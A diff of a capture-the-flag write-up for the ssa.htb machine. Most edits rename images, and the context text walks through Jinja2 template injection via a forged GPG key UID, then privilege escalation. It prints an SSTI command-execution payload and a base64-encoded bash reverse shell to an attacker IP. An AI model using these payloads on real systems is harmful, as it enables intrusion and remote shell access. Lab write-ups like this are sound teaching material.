@@ -23,25 +23,25 @@ We have to add `ssa.htb` to our `/etc/hosts` file to visit the HTTPS site.&#x20;
 
 The website promotes an agency for spies:
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 The contact page allows us to send messages that are encrypted with a key:
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 If we check out their guide. we would find that the website allows us to view encrypt and decrypt messages using our own key:
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 At the bottom of the page, we can also see some indication of a user:
 
-<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
 So we can import our own keys into the system, and encrypt our own messages. I don't think these messages are being used in any way or sent anywhere, so the decrypting and encrypting messages part is not that interesting.
 
 The most interesting is the function verifying keys using a public key and signed text:
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 Since there is a user associated with the GPG key, we can try to generate one with a different UID:
 
@@ -70,11 +70,11 @@ iQGzBAEBCgAdFiEEMepfyD8ks+mbh4he1vYv2J1mwLcFAmSRCtsACgkQ1vYv2J1m
 
 Afterwards, we can take both texts and use the website to verify our signature:
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
 When we click "Verify", it would show that it worked:
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
 This website also seems to print out the username `test123` that I have supplied. This parameter might be unsanitised, and vulnerable to OS command injection or something. We can use the `--edit-key` flag to edit the UID we have specified in the key:
 
@@ -114,11 +114,11 @@ uid           [ultimate] test123
 sub   rsa3072 2023-06-20 [E]
 ```
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 A bit more testing revealed that `{{7*'7'}}` works as well:
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
 
 I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 
@@ -126,7 +126,7 @@ I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 I tried to execute this, but it didn't work:
 
@@ -140,7 +140,7 @@ What works is a `base64` encoded bash reverse shell command since the UID of the
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSAK | base64 -d | bash').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -194,7 +194,7 @@ cat admin.json
 
 With this, we can `ssh` into the next user and grab the user flag:
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
 ### Tipnet + Cargo
 
@@ -289,6 +289,6 @@ You can now run 'firejail --join=10543' in another terminal to obtain a shell wh
 
 Then in another shell:
 
-<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!&#x20;
